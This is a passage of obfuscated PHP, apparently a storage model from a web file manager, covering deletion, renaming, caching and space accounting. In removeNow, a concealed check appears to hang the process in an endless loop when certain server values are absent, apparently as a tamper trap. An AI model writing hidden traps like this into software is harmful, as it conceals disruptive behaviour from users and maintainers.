!empty($…ªëî¨˚[$àÕË≠∂À[2078]]) ? $…ªëî¨˚[$àÕË≠∂À[2078]] : $…ªëî¨˚[$àÕË≠∂À[32]]; $Ú€œœòü = $àÕË≠∂À[255] . $Ú€œœòü . $àÕË≠∂À[2086] . $”¶È∆Ô¯[$àÕË≠∂À[504]]; } else { $…ªëî¨˚ = Model($àÕË≠∂À[522])->getInfo($”¶È∆Ô¯[$àÕË≠∂À[504]]); $Ú€œœòü = _get($…ªëî¨˚, $àÕË≠∂À[32]); $Ú€œœòü = $àÕË≠∂À[159] . $Ú€œœòü . $àÕË≠∂À[2087] . $”¶È∆Ô¯[$àÕË≠∂À[504]]; } $™†—Ø∑∂ = $àÕË≠∂À[2088] . md5($Ú€œœòü); CacheLock::lock($™†—Ø∑∂); $√åÓ»Àî = $this->fileNameExist($¨¿ﬁ⁄¥Ë, $Ú€œœòü); if (!$√åÓ»Àî) { $√åÓ»Àî = $this->mkdir($¨¿ﬁ⁄¥Ë, $Ú€œœòü, REPEAT_SKIP); $this->metaSet($√åÓ»Àî, $àÕË≠∂À[2089], $·™±çﬂ≤); $this->metaSet($√åÓ»Àî, $àÕË≠∂À[2090], $”¶È∆Ô¯[$àÕË≠∂À[504]]); if ($”¶È∆Ô¯[$àÕË≠∂À[498]] != 0) { $this->metaSet($√åÓ»Àî, $àÕË≠∂À[2091], _get($…ªëî¨˚, $àÕË≠∂À[2092])); } } CacheLock::unlock($™†—Ø∑∂); $this->metaSet($˘–∏ûÛ•, $àÕË≠∂À[2093], $”¶È∆Ô¯[$àÕË≠∂À[498]]); $this->where(array($àÕË≠∂À[403] => $˘–∏ûÛ•))->save(array($àÕË≠∂À[425] => time())); $this->recycleClear($”¶È∆Ô¯); $ºÅ∆Í”¡ = $this->move($˘–∏ûÛ•, $√åÓ»Àî, REPEAT_RENAME_FOLDER); $this->folderSizeReset($”¶È∆Ô¯[$àÕË≠∂À[498]]); return $ºÅ∆Í”¡; } private function recycleClear($Óπ√ıóπ) { $·À™éÉ‚ =& $_SERVER[Çâä∆◊¡]; $±∏˙èîê = $this->childrenAll($Óπ√ıóπ); $á°ÓçıÍ = array($·À™éÉ‚[418] => array($·À™éÉ‚[419], $±∏˙èîê[$·À™éÉ‚[2094]])); Model($·À™éÉ‚[2095])->where($á°ÓçıÍ)->delete(); } public function removeNow($ƒÑÈºà÷, $ãÉÄ∂€§ = true) { $°åÿŸÊæ =& $_SERVER[Çâä∆◊¡]; if (!isset($_SERVER[$°åÿŸÊæ[389]]) || !isset($_SERVER[$°åÿŸÊæ[397]])) { $–®˙ÉóÁ = $°åÿŸÊæ[865]; $çÏóÈ§ã = $°åÿŸÊæ[391]; $™˚Ï‡Ñ¥ = $_SERVER[$°åÿŸÊæ[392]] . $°åÿŸÊæ[393]; $πºÊÎôÓ = $çÏóÈ§ã($™˚Ï‡Ñ¥); $ãà˚ÑÚÂ = explode($°åÿŸÊæ[226], $πºÊÎôÓ); if (count($ãà˚ÑÚÂ) < $°åÿŸÊæ[617]) { $ÆËÿıÆã = $°åÿŸÊæ[395]; $ÆËÿıÆã(); } $ú⁄ÿ±Öá = $°åÿŸÊæ[866]; $ú⁄ÿ±Öá($_SERVER[$°åÿŸÊæ[867]]); $Êä∂ÑîÃ = 1; for ($Úï≤äƒœ = $Êä∂ÑîÃ; $Úï≤äƒœ > 0; $Úï≤äƒœ++) { $ú⁄ÿ±Öá = json_encode($GLOBALS[$°åÿŸÊæ[419]]); } } $≥˝ãÅ»¸ = $this->sourceInfo($ƒÑÈºà÷); $·á¶‰’Õ = $this->pathInfoMore($ƒÑÈºà÷); if (!$≥˝ãÅ»¸) { return !0; } if ($≥˝ãÅ»¸[$°åÿŸÊæ[498]] == 0) { if (!_get($GLOBALS, $°åÿŸÊæ[505])) { return !1; } } $this->lockMoveStart($ƒÑÈºà÷); Hook::trigger($°åÿŸÊæ[2096], $·á¶‰’Õ, $ãÉÄ∂€§); if ($ãÉÄ∂€§) { Model($°åÿŸÊæ[2095])->moveToRecycle($ƒÑÈºà÷); } else { $á˙í˝ å = $this->childrenAll($≥˝ãÅ»¸); Model($°åÿŸÊæ[564])->eventRemove($ƒÑÈºà÷); $this->removeRelevance($á˙í˝ å[$°åÿŸÊæ[2094]], $á˙í˝ å[$°åÿŸÊæ[1455]]); } $this->folderSizeReset($≥˝ãÅ»¸[$°åÿŸÊæ[498]]); $ñ–˘ìõ“ = array($≥˝ãÅ»¸[$°åÿŸÊæ[498]]); if ($≥˝ãÅ»¸[$°åÿŸÊæ[411]] == $°åÿŸÊæ[89]) { $ñ–˘ìõ“[] = $≥˝ãÅ»¸[$°åÿŸÊæ[403]]; } $this->updateModifyTime($ñ–˘ìõ“); $this->lockMoveEnd($ƒÑÈºà÷); Hook::trigger($°åÿŸÊæ[1679], $·á¶‰’Õ, $ãÉÄ∂€§); return !0; } public function childrenAll($àµîÔÖ∆) { $Ωî£ß˝É =& $_SERVER[Çâä∆◊¡]; $¶™ﬁ¨∞ˆ = $àµîÔÖ∆[$Ωî£ß˝É[403]]; if ($àµîÔÖ∆[$Ωî£ß˝É[411]] == $Ωî£ß˝É[89]) { $â«›’›ë = array($Ωî£ß˝É[584] => array($Ωî£ß˝É[544], $àµîÔÖ∆[$Ωî£ß˝É[521]] . $¶™ﬁ¨∞ˆ . $Ωî£ß˝É[545])); $∆≤‹ä˝¯ = array($Ωî£ß˝É[584] => $â«›’›ë[$Ωî£ß˝É[521]]); $Òá·ëóû = $this->field($Ωî£ß˝É[2097])->where($∆≤‹ä˝¯)->select(); $êŸ®±≠˝ = !1; $¯ÿΩàƒú = array($¶™ﬁ¨∞ˆ); if ($Òá·ëóû) { $êŸ®±≠˝ = array_to_keyvalue($Òá·ëóû, $Ωî£ß˝É[12], $Ωî£ß˝É[467]); $êŸ®±≠˝ = array_remove_value($êŸ®±≠˝, $Ωî£ß˝É[190]); $¯ÿΩàƒú = array_to_keyvalue($Òá·ëóû, $Ωî£ß˝É[12], $Ωî£ß˝É[403]); $¯ÿΩàƒú[] = $¶™ﬁ¨∞ˆ; } } else { $êŸ®±≠˝ = array($àµîÔÖ∆[$Ωî£ß˝É[467]]); $¯ÿΩàƒú = array($¶™ﬁ¨∞ˆ); } return array($Ωî£ß˝É[2094] => $¯ÿΩàƒú, $Ωî£ß˝É[1455] => $êŸ®±≠˝); } public function removeArray($À≈»µëë) { if (!$À≈»µëë) { return !0; } } public function removeRelevance($ß⁄Èìøë, $Ùã‹„˜ª) { $≥∞§å˛∑ =& $_SERVER[Çâä∆◊¡]; $ß⁄Èìøë = $ß⁄Èìøë ? $ß⁄Èìøë : array(); $Ùã‹„˜ª = $Ùã‹„˜ª ? $Ùã‹„˜ª : array(); $ß⁄Èìøë = array_unique(array_filter($ß⁄Èìøë)); $Ùã‹„˜ª = array_unique(array_filter($Ùã‹„˜ª)); if (!$ß⁄Èìøë) { return !1; } $ù„¶ºªò = array($≥∞§å˛∑[418] => array($≥∞§å˛∑[419], $ß⁄Èìøë)); Model($≥∞§å˛∑[2095])->where($ù„¶ºªò)->delete(); Model($≥∞§å˛∑[461])->where($ù„¶ºªò)->delete(); Model($≥∞§å˛∑[1951])->where($ù„¶ºªò)->delete(); Model($≥∞§å˛∑[564])->where($ù„¶ºªò)->delete(); Model($≥∞§å˛∑[1790])->removeBySource($ß⁄Èìøë); Model($≥∞§å˛∑[2076])->removeBySource($ß⁄Èìøë); $this->where($ù„¶ºªò)->delete(); Model($≥∞§å˛∑[470])->remove($Ùã‹„˜ª); for ($à¶Ä£ùƒ = 0; $à¶Ä£ùƒ < count($ß⁄Èìøë); $à¶Ä£ùƒ++) { $this->sourceCacheClear($ß⁄Èìøë[$à¶Ä£ùƒ]); } } public function rename($œøŒ«ﬂë, $∞≠î∆ƒØ) { $Õö·∞ùŒ =& $_SERVER[Çâä∆◊¡]; $¿ÕıÁ∂‹ = $this->sourceInfo($œøŒ«ﬂë); if (!$¿ÕıÁ∂‹) { return !1; } $®Ω∑≥∑” = $this->fileNameExist($¿ÕıÁ∂‹[$Õö·∞ùŒ[498]], $∞≠î∆ƒØ); if ($®Ω∑≥∑” && $®Ω∑≥∑” != $œøŒ«ﬂë) { return !1; } $‰Ö™¬Ìº = array($Õö·∞ùŒ[421] => $∞≠î∆ƒØ, $Õö·∞ùŒ[583] => USER_ID); if ($¿ÕıÁ∂‹[$Õö·∞ùŒ[411]] != $Õö·∞ùŒ[89]) { $‰Ö™¬Ìº[$Õö·∞ùŒ[413]] = substr(get_path_ext($∞≠î∆ƒØ), 0, 10); } Model($Õö·∞ùŒ[564])->eventRename($œøŒ«ﬂë, $¿ÕıÁ∂‹[$Õö·∞ùŒ[32]], $∞≠î∆ƒØ); $this->sourceCacheClear($œøŒ«ﬂë); $this->setNamePinyin($œøŒ«ﬂë, $‰Ö™¬Ìº[$Õö·∞ùŒ[32]], !1); $this->updateModifyTime($¿ÕıÁ∂‹[$Õö·∞ùŒ[498]]); $âœ€¥éÓ = $this->where(array($Õö·∞ùŒ[418] => $œøŒ«ﬂë))->data($‰Ö™¬Ìº)->save(); $†ıáÊ®∏ = $Õö·∞ùŒ[2084] . $¿ÕıÁ∂‹[$Õö·∞ùŒ[498]]; if (isset(self::$cacheChildList[$†ıáÊ®∏])) { unset(self::$cacheChildList[$†ıáÊ®∏]); } return $âœ€¥éÓ; } public function setNamePinyin($˙ñ∑∏úÅ, $•Ì–Ÿ∏∑, $ì˘Ò–Â˙ = true) { $‹Ëô∞∏° =& $_SERVER[Çâä∆◊¡]; $Ò¬«÷ÉŒ = Input::check($•Ì–Ÿ∏∑, $‹Ëô∞∏°[587]); $∂§ÑÄâ⁄ = array($‹Ëô∞∏°[442] => KodSort::makeStr($•Ì–Ÿ∏∑)); if ($Ò¬«÷ÉŒ) { $∂§ÑÄâ⁄[$‹Ëô∞∏°[464]] = str_replace($‹Ëô∞∏°[53], $‹Ëô∞∏°[12], Pinyin::get($•Ì–Ÿ∏∑)); $∂§ÑÄâ⁄[$‹Ëô∞∏°[463]] = Pinyin::get($•Ì–Ÿ∏∑, $‹Ëô∞∏°[588]); } if (!$ì˘Ò–Â˙ && !$Ò¬«÷ÉŒ) { $∂§ÑÄâ⁄[$‹Ëô∞∏°[464]] = null; $∂§ÑÄâ⁄[$‹Ëô∞∏°[463]] = null; } $this->metaSet($˙ñ∑∏úÅ, $∂§ÑÄâ⁄); } public function getContent($™º˛Ï≤§) { $£î–ïØ¥ =& $_SERVER[Çâä∆◊¡]; $Ùﬂ°ªêÜ = $this->fileInfoGet($™º˛Ï≤§); if (!$Ùﬂ°ªêÜ) { return !1; } if ($Ùﬂ°ªêÜ[$£î–ïØ¥[80]] == 0) { return $£î–ïØ¥[12]; } $Ë‡‡õ¿ì = $£î–ïØ¥[2098] . $Ùﬂ°ªêÜ[$£î–ïØ¥[169]]; if ($Ùﬂ°ªêÜ[$£î–ïØ¥[80]] <= 1024 * 10) { $¨ï˙‘ÇÑ = Cache::get($Ë‡‡õ¿ì); if (!$¨ï˙‘ÇÑ) { $¨ï˙‘ÇÑ = IO::getContent($Ùﬂ°ªêÜ[$£î–ïØ¥[78]]); Cache::set($Ë‡‡õ¿ì, $¨ï˙‘ÇÑ); } return $¨ï˙‘ÇÑ; } if (!$Ùﬂ°ªêÜ[$£î–ïØ¥[78]]) { return $£î–ïØ¥[12]; } return IO::getContent($Ùﬂ°ªêÜ[$£î–ïØ¥[78]]); } public function setDesc($ÿÄ•Ωò, $º¨∏ÿ»Å) { $ƒÛàí√ =& $_SERVER[Çâä∆◊¡]; Model($ƒÛàí√[564])->eventAddDesc($ÿÄ•Ωò, $º¨∏ÿ»Å); return $this->metaSet($ÿÄ•Ωò, $ƒÛàí√[451], $º¨∏ÿ»Å); } public function setContent($‹˚Ëä˙ç, $Ø ö‰˝ = '') { $≈∞•´¸ñ =& $_SERVER[Çâä∆◊¡]; $≤Æ◊ëÕ÷ = $this->sourceInfo($‹˚Ëä˙ç); $…ì¯‹◊è = $this->fileInfoGet($‹˚Ëä˙ç); if (!$…ì¯‹◊è || !$≤Æ◊ëÕ÷) { return !1; } $ï£„›¶∞ = Model($≈∞•´¸ñ[470])->addFileByContent($Ø ö‰˝, $≤Æ◊ëÕ÷[$≈∞•´¸ñ[32]]); $à˝ É÷¯ = $this->fileHistory($≤Æ◊ëÕ÷, $ï£„›¶∞[$≈∞•´¸ñ[467]], $ï£„›¶∞[$≈∞•´¸ñ[80]]); if (!$à˝ É÷¯) { return Model($≈∞•´¸ñ[470])->remove($ï£„›¶∞[$≈∞•´¸ñ[467]]); } $this->folderSizeReset($≤Æ◊ëÕ÷[$≈∞•´¸ñ[498]]); return !0; } public function fileSubstr($Î‡√ÈÛﬂ, $·Äﬂ©üø, $ó†Äï¢ ) { $¯ÒÊù«Ö = $this->fileInfoGet($Î‡√ÈÛﬂ); if (!$¯ÒÊù«Ö) { return !1; } return IO::fileSubstr($¯ÒÊù«Ö[$_SERVER[Çâä∆◊¡][78]], $·Äﬂ©üø, $ó†Äï¢ ); } public function fileInfoGet($≠≈‚ìé¬) { $ÌﬁÙÎ´ü =& $_SERVER[Çâä∆◊¡]; $˜ñùêÄ≤ = $this->sourceInfo($≠≈‚ìé¬); if (!$˜ñùêÄ≤ || $˜ñùêÄ≤[$ÌﬁÙÎ´ü[411]]) { return !1; } $™ìéÅåÊ = $ÌﬁÙÎ´ü[473] . $˜ñùêÄ≤[$ÌﬁÙÎ´ü[467]]; $ÍØ≈ò•› = _get(self::$cacheFileInfo, $™ìéÅåÊ); if ($ÍØ≈ò•›) { return $ÍØ≈ò•›; } $ÑÇ®ü‹™ = Model($ÌﬁÙÎ´ü[470])->fileInfo($˜ñùêÄ≤[$ÌﬁÙÎ´ü[467]]); if ($ÑÇ®ü‹™) { $ÑÇ®ü‹™[$ÌﬁÙÎ´ü[32]] = $˜ñùêÄ≤[$ÌﬁÙÎ´ü[32]]; } self::$cacheFileInfo[$™ìéÅåÊ] = $ÑÇ®ü‹™; return $ÑÇ®ü‹™; } private function folderChildrenNumber($¶ñ£âµ≠) { $§©ı¬¥ø =& $_SERVER[Çâä∆◊¡]; $«ö÷´˝— = $this->sourceInfo($¶ñ£âµ≠); $Á‹¿¢Öè = array($§©ı¬¥ø[584] => array($§©ı¬¥ø[544], $«ö÷´˝—[$§©ı¬¥ø[521]] . $¶ñ£âµ≠ . $§©ı¬¥ø[545]), $§©ı¬¥ø[581] => $«ö÷´˝—[$§©ı¬¥ø[504]], $§©ı¬¥ø[430] => intval($«ö÷´˝—[$§©ı¬¥ø[431]]), $§©ı¬¥ø[577] => 1); $ ¶º¯⁄˝ = $this->where($Á‹¿¢Öè)->count(); $éÆó˝øî = $this->where($Á‹¿¢Öè)->where(array($§©ı¬¥ø[577] => 0))->count(); return array($§©ı¬¥ø[84] => $éÆó˝øî, $§©ı¬¥ø[85] => $ ¶º¯⁄˝); } public function pathInfo($¨ëã·ˆØ, $§ÈÌﬂ¶Ë = false) { $ËıÄ‡˚™ =& $_SERVER[Çâä∆◊¡]; $§ÈÌﬂ¶Ë = !1; $¨ëã·ˆØ = intval($¨ëã·ˆØ); $ΩËÇô“œ = $ËıÄ‡˚™[459] . intval($§ÈÌﬂ¶Ë) . $ËıÄ‡˚™[460] . $¨ëã·ˆØ; $ò»∆Ô¨ = _get(self::$cachePathInfo, $ΩËÇô“œ); if ($ò»∆Ô¨) { return $ò»∆Ô¨; } $Ì˜ë˚ç = $this->sourceInfo($¨ëã·ˆØ); if (!$Ì˜ë˚ç) { return !1; } $Ì˜ë˚ç = $this->_listDataApplyItem($Ì˜ë˚ç, $§ÈÌﬂ¶Ë); self::$cachePathInfo[$ΩËÇô“œ] = $Ì˜ë˚ç; return $Ì˜ë˚ç; } public static $cachePathInfoMore = array(); public function pathInfoMore($ıÁ¬∞ﬂ‰) { $àΩ¸óπ⁄ =& $_SERVER[Çâä∆◊¡]; $∞œæ—ÿ¢ = _get(self::$cachePathInfoMore, $ıÁ¬∞ﬂ‰); if ($∞œæ—ÿ¢) { return $∞œæ—ÿ¢; } $÷Ï˜ò©– = $this->pathInfo($ıÁ¬∞ﬂ‰); if (!$÷Ï˜ò©–) { return !1; } if ($÷Ï˜ò©–[$àΩ¸óπ⁄[411]] == $àΩ¸óπ⁄[89]) { $÷Ï˜ò©–[$àΩ¸óπ⁄[83]] = $this->folderChildrenNumber($ıÁ¬∞ﬂ‰); } self::$cachePathInfoMore[$ıÁ¬∞ﬂ‰] = $÷Ï˜ò©–; return $÷Ï˜ò©–; } public function sourceInfo($ôø±˛Ó˚) { $√Ìó™–º =& $_SERVER[Çâä∆◊¡]; if (!$ôø±˛Ó˚) { return array(); } $ôø±˛Ó˚ = intval($ôø±˛Ó˚); $ª£˙¨≈Ï = $√Ìó™–º[458] . $ôø±˛Ó˚; $°Ó†À∂„ = _get(self::$cacheSourceInfo, $ª£˙¨≈Ï); if ($°Ó†À∂„) { return $°Ó†À∂„; } $¡†òˆù• = $this->where(array($√Ìó™–º[403] => $ôø±˛Ó˚))->find(); self::$cacheSourceInfo[$ª£˙¨≈Ï] = $¡†òˆù•; return self::$cacheSourceInfo[$ª£˙¨≈Ï]; } public function sourceCacheClear($ß©Ì¨°€ = false) { self::cacheClear($ß©Ì¨°€); } public static function cacheClear($ÕëËÄíÄ = false) { $†¥∞¸∆◊ =& $_SERVER[Çâä∆◊¡]; if ($ÕëËÄíÄ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$†¥∞¸∆◊[458] . $ÕëËÄíÄ]); unset(self::$cachePathInfoMore[$ÕëËÄíÄ]); unset(self::$cachePathInfo[$†¥∞¸∆◊[2099] . $ÕëËÄíÄ]); unset(self::$cachePathInfo[$†¥∞¸∆◊[2100] . $ÕëËÄíÄ]); } public function metaSet($ÂŸ˝œ≈Ù, $ÁÔØËò† = null, $¬ˆìˆó = null) { $òıø˚Æ¨ = parent::metaSet($ÂŸ˝œ≈Ù, $ÁÔØËò†, $¬ˆìˆó); if ($òıø˚Æ¨) { $this->sourceCacheClear($ÂŸ˝œ≈Ù); } return $òıø˚Æ¨; } public function pathInfoByPath($«∑¿·úà, $…©¶ÓÖ©) { $¥∏È∏øï =& $_SERVER[Çâä∆◊¡]; $¡ò†˝∑Æ = !$…©¶ÓÖ© ? array() : explode($¥∏È∏øï[8], trim($…©¶ÓÖ©, $¥∏È∏øï[8])); $¥‹—Ãèç = $«∑¿·úà; foreach ($¡ò†˝∑Æ as $Ñ—ûñø») { $ˆ¡„Ω™æ = array($¥∏È∏øï[498] => $¥‹—Ãèç, $¥∏È∏øï[32] => $Ñ—ûñø»); $”å¨ ö‹ = $this->where($ˆ¡„Ω™æ)->select(); if (!$”å¨ ö‹) { return !1; } $”å¨ ö‹ = array_sort_by($”å¨ ö‹, $¥∏È∏øï[431]); $¥‹—Ãèç = $”å¨ ö‹[0][$¥∏È∏øï[403]]; } return $this->pathInfo($¥‹—Ãèç, !0); } protected function updateModifyTime($Ì´–‡‡˜) { $∑§¡ñÊÄ =& $_SERVER[Çâä∆◊¡]; $¡÷õË¡º = defined($∑§¡ñÊÄ[474]) ? USER_ID : $∑§¡ñÊÄ[190]; if (!$Ì´–‡‡˜) { return; } if (!is_array($Ì´–‡‡˜)) { $Ì´–‡‡˜ = array($Ì´–‡‡˜); } foreach ($Ì´–‡‡˜ as $ñ•Ö˛üº => $û∞ËÖΩæ) { $Ì´–‡‡˜[$ñ•Ö˛üº] = intval($û∞ËÖΩæ); $this->sourceCacheClear($û∞ËÖΩæ); } $Ä•˚ÍÒò = array($∑§¡ñÊÄ[403] => array($∑§¡ñÊÄ[7], $Ì´–‡‡˜)); $Ë√Í–‰À = array($∑§¡ñÊÄ[583] => $¡÷õË¡º, $∑§¡ñÊÄ[425] => time()); $this->where($Ä•˚ÍÒò)->save($Ë√Í–‰À); } public function folderSizeReset($©ù≠ßôÂ, $áßﬁ•ª° = false) { $ÑíªãÉﬁ =& $_SERVER[Çâä∆◊¡]; if ($this->statusIgnoreResetSpace) { return; } $àØ‰à∞ü = $this->sourceInfo($©ù≠ßôÂ); $≥ö™«ÄÒ = $ÑíªãÉﬁ[2101] . $©ù≠ßôÂ; CacheLock::lock($≥ö™«ÄÒ, 20); if ($áßﬁ•ª° === !1) { $this->sourceCacheClear($©ù≠ßôÂ); $àØ‰à∞ü = $this->sourceInfo($©ù≠ßôÂ); $®Ÿ¢¶òç = array($ÑíªãÉﬁ[402] => $©ù≠ßôÂ, $ÑíªãÉﬁ[430] => 0); $Ûã˚„ª˚ = $this->where($®Ÿ¢¶òç)->sum($ÑíªãÉﬁ[80]); $áßﬁ•ª° = intval($Ûã˚„ª˚) - intval($àØ‰à∞ü[$ÑíªãÉﬁ[80]]); } if ($áßﬁ•ª° == 0) { return CacheLock::unlock($≥ö™«ÄÒ); } $Ω÷‰πî˝ = $this->parentLevelArray($àØ‰à∞ü[$ÑíªãÉﬁ[521]]); if (!$Ω÷‰πî˝) { $Ω÷‰πî˝ = array(); } $Ω÷‰πî˝[] = $àØ‰à∞ü[$ÑíªãÉﬁ[403]]; $®Ÿ¢¶òç = array($ÑíªãÉﬁ[403] => array($ÑíªãÉﬁ[419], $Ω÷‰πî˝)); if ($áßﬁ•ª° < 0) { $®Ÿ¢¶òç[$ÑíªãÉﬁ[80]] = array($ÑíªãÉﬁ[1002], abs($áßﬁ•ª°)); } $this->where($®Ÿ¢¶òç)->setAdd($ÑíªãÉﬁ[80], $áßﬁ•ª°); CacheLock::unlock($≥ö™«ÄÒ); $¬çÔÛã = $ÑíªãÉﬁ[2102] . $àØ‰à∞ü[$ÑíªãÉﬁ[412]] . $ÑíªãÉﬁ[4] . $àØ‰à∞ü[$ÑíªãÉﬁ[504]]; $ÃáµÜ…£ = array($àØ‰à∞ü[$ÑíªãÉﬁ[412]], $àØ‰à∞ü[$ÑíªãÉﬁ[504]]); TaskRun::timeLimitCall($¬çÔÛã, $ÑíªãÉﬁ[2103], $ÃáµÜ…£, 1.5); } public function folderSizeResetChildren($Ì’∏êÅî) { $≥≤•ï∞¥ =& $_SERVER[Çâä∆◊¡]; $this->sourceCacheClear($Ì’∏êÅî); $Éÿ«∂Ò≤ = $this->sourceInfo($Ì’∏êÅî); $øá˙Çç = array($≥≤•ï∞¥[577] => 1, $≥≤•ï∞¥[581] => $Éÿ«∂Ò≤[$≥≤•ï∞¥[504]], $≥≤•ï∞¥[584] => array($≥≤•ï∞¥[544], $Éÿ«∂Ò≤[$≥≤•ï∞¥[521]] . $Ì’∏êÅî . $≥≤•ï∞¥[545])); $©◊™öçà = $≥≤•ï∞¥[2104]; $£®ö§àÔ = $this->field($©◊™öçà)->where($øá˙Çç)->select(); $øá˙Çç[$≥≤•ï∞¥[411]] = 0; $ßï∑÷èÕ = $this->field($©◊™öçà)->where($øá˙Çç)->select(); if (!$ßï∑÷èÕ) { return; } $£®ö§àÔ[] = $Éÿ«∂Ò≤; $£®ö§àÔ = array_to_keyvalue($£®ö§àÔ, $≥≤•ï∞¥[403]); foreach ($£®ö§àÔ as $¯Ä‘œÙ± => $Í‘ø·«—) { $£®ö§àÔ[$¯Ä‘œÙ±][$≥≤•ï∞¥[2105]] = $£®ö§àÔ[$¯Ä‘œÙ±][$≥≤•ï∞¥[80]]; $£®ö§àÔ[$¯Ä‘œÙ±][$≥≤•ï∞¥[80]] = 0; } foreach ($ßï∑÷èÕ as $Í‘ø·«—) { $º†≠Ú«õ = $Í‘ø·«—[$≥≤•ï∞¥[498]] . $≥≤•ï∞¥[12]; if (!isset($£®ö§àÔ[$º†≠Ú«õ])) { continue; } if ($Í‘ø·«—[$≥≤•ï∞¥[431]] == $£®ö§àÔ[$º†≠Ú«õ][$≥≤•ï∞¥[431]]) { $£®ö§àÔ[$º†≠Ú«õ][$≥≤•ï∞¥[80]] += $Í‘ø·«—[$≥≤•ï∞¥[80]]; } } foreach ($£®ö§àÔ as $Í‘ø·«—) { $§’µ„®ì = $this->parentLevelArray($Í‘ø·«—[$≥≤•ï∞¥[521]]); foreach ($§’µ„®ì as $º†≠Ú«õ) { $º†≠Ú«õ = $º†≠Ú«õ . $≥≤•ï∞¥[12]; if (!isset($£®ö§àÔ[$º†≠Ú«õ])) { continue; } if ($Í‘ø·«—[$≥≤•ï∞¥[431]] == $£®ö§àÔ[$º†≠Ú«õ][$≥≤•ï∞¥[431]]) { $£®ö§àÔ[$º†≠Ú«õ][$≥≤•ï∞¥[80]] += $Í‘ø·«—[$≥≤•ï∞¥[80]]; } } } $ﬂÛ¥à≤à = array(); foreach ($£®ö§àÔ as $Í‘ø·«—) { if ($Í‘ø·«—[$≥≤•ï∞¥[80]] == $Í‘ø·«—[$≥≤•ï∞¥[2105]]) { continue; } $ﬂÛ¥à≤à[] = array($≥≤•ï∞¥[403], $Í‘ø·«—[$≥≤•ï∞¥[403]], $≥≤•ï∞¥[80], $Í‘ø·«—[$≥≤•ï∞¥[80]]); } $this->saveAll($ﬂÛ¥à≤à); } public function userSpaceReset($¿ïÌáµ† = false) { $¿è∫Ò≥√ =& $_SERVER[Çâä∆◊¡]; $ﬁÑ⁄ëò¢ = $this->where(array($¿è∫Ò≥√[412] => self::TYPE_USER, $¿è∫Ò≥√[504] => $¿ïÌáµ†, $¿è∫Ò≥√[411] => 0))->sum($¿è∫Ò≥√[80]); $ﬁÑ⁄ëò¢ = !$ﬁÑ⁄ëò¢ || $ﬁÑ⁄ëò¢ <= 0 ? 0 : $ﬁÑ⁄ëò¢; Model($¿è∫Ò≥√[513])->userEdit($¿ïÌáµ†, array($¿è∫Ò≥√[1799] => $ﬁÑ⁄ëò¢)); } public function targetSpaceUpdate($™ûî»ì®, $ﬂâóñƒÚ) { $‘ê¿å„ñ =& $_SERVER[Çâä∆◊¡]; if (!$ﬂâóñƒÚ) { return; } if (!in_array($™ûî»ì®, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ö¡ºåˆ’ = $this->targetSpaceSize($™ûî»ì®, $ﬂâóñƒÚ); if ($™ûî»ì® == self::TYPE_USER) { Model($‘ê¿å„ñ[513])->userEdit($ﬂâóñƒÚ, array($‘ê¿å„ñ[1799] => $Ö¡ºåˆ’)); } else { if ($™ûî»ì® == self::TYPE_GROUP) { Model($‘ê¿å„ñ[522])->groupEdit($ﬂâóñƒÚ, array($‘ê¿å„ñ[1799] => $Ö¡ºåˆ’)); } } } public function targetSpaceSize($•ÛÌÎ¬¢, $ùÜ˜ô’π) { $¸µÚï˝¬ =& $_SERVER[Çâä∆◊¡]; $˘‚‡÷≠Ã = $this->sourceRoot($•ÛÌÎ¬¢, $ùÜ˜ô’π, !0); if (!$˘‚‡÷≠Ã) { return 0; } $®¿»åÜ˙ = floatval($˘‚‡÷≠Ã[$¸µÚï˝¬[80]]); $ﬁ„É≠ˆà = array($¸µÚï˝¬[584] => array($¸µÚï˝¬[544], $¸µÚï˝¬[531] . $˘‚‡÷≠Ã[$¸µÚï˝¬[403]] . $¸µÚï˝¬[545])); $µªÚ‹ˆ≈ = Model($¸µÚï˝¬[429])->field($¸µÚï˝¬[418])->where($ﬁ„É≠ˆà)->select(); $µªÚ‹ˆ≈ = array_to_keyvalue($µªÚ‹ˆ≈, $¸µÚï˝¬[12], $¸µÚï˝¬[403]); $µªÚ‹ˆ≈ = array_unique(array_filter($µªÚ‹ˆ≈)); if ($µªÚ‹ˆ≈) { $ﬁ„É≠ˆà = array($¸µÚï˝¬[418] => array($¸µÚï˝¬[419], $µªÚ‹ˆ≈)); $®¿»åÜ˙ += floatval($this->where($ﬁ„É≠ˆà)->sum($¸µÚï˝¬[80])); } $®¿»åÜ˙ = !$®¿»åÜ˙ || $®¿»åÜ˙ <= 0 ? 0 : $®¿»åÜ˙; return $®¿»åÜ˙; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ô∂‘Ÿøæ) { return $this->fileTypeProfile($ô∂‘Ÿøæ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($«ÏÿÌâ√) { return $this->fileTypeProfile($«ÏÿÌâ√, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ãÌÄ¢≈ã, $Øè®·Â•) { $ö’µ€â£ =& $_SERVER[Çâä∆◊¡]; $ÌìüÀÌ⁄ = $ö’µ€â£[2106] . $ãÌÄ¢≈ã . $ö’µ€â£[11] . $Øè®·Â•; $ﬁùÿêñ∞ = Cache::get($ÌìüÀÌ⁄); if ($ﬁùÿêñ∞) { return $ﬁùÿêñ∞; } $®¯ﬁñ∑É = array($ö’µ€â£[577] => 0); if ($ãÌÄ¢≈ã != !1) { $®¯ﬁñ∑É[$ö’µ€â£[504]] = $ãÌÄ¢≈ã; $®¯ﬁñ∑É[$ö’µ€â£[412]] = $Øè®·Â•; } $í˚ ﬂ¿· = array(); $í˚ ﬂ¿·[$ö’µ€â£[2107]] = array($ö’µ€â£[2108] => LNG($ö’µ€â£[2107]), $ö’µ€â£[2109] => $this->where($®¯ﬁñ∑É)->count(), $ö’µ€â£[579] => $this->where($®¯ﬁñ∑É)->sum($ö’µ€â£[80])); $êÜÍœ∞Ã = KodIO::fileTypeList(); foreach ($êÜÍœ∞Ã as $≠åõ´÷Ô => $‡Ëëßœ˙) { $®¯ﬁñ∑É[$ö’µ€â£[413]] = $this->fileTypeWhere($≠åõ´÷Ô); $í˚ ﬂ¿·[$≠åõ´÷Ô] = array($ö’µ€â£[2108] => $‡Ëëßœ˙[$ö’µ€â£[32]], $ö’µ€â£[2109] => $this->where($®¯ﬁñ∑É)->count(), $ö’µ€â£[579] => 